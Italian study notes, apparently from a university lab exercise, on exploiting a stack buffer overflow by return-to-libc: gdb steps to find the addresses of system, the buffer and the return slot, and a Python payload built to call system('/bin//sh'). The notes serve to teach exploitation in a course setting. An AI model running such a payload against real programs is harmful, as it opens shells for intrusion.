# Indirizzo di System
- Per individuare l'indirizzo di system da gdb eseguire
    - p system
    - risultato:0xb7ecffb0
# Risoluzione
    - breakpoint all'inizio
    - Ricostruisco il layout dopo il prologo
    - localizzo buffer e ret
    - Continuo fino all'epilogo
    - Ricostruisco il layout prima del ritorno 
# Indirizzo di buffer
- Per individuarlo vado a mettere un brackpoint prima della gets dato che so che buffer viene passato come primo parametro e che quindi il sui indirizzo sarà nel registro eax
    - risultato: 0xb7f0186e 
    - risultato: 0xbffffc8c
    - \x6e\x18\xf0\xb7
# Indirizzo di ret
- nel codice vediamo come ret sia uguale a -0xc($ebp) questo significa che l'indirizzo si trova in $ebp - 12
    - risultato: 0xbffffccc


# Payload corretto
- Quello del prof fa riferimento ad indirizzi differenti, questo è quello aggiornato rispetto ai miei indirizzi
```python
#!/usr/bin/python

print '/bin//sh\x00' + 'a' * 71 + '\xb0\xff\xec\xb7' + '\x42\x42\x42\x42' + '\x8c\xfc\xff\xbf'
```

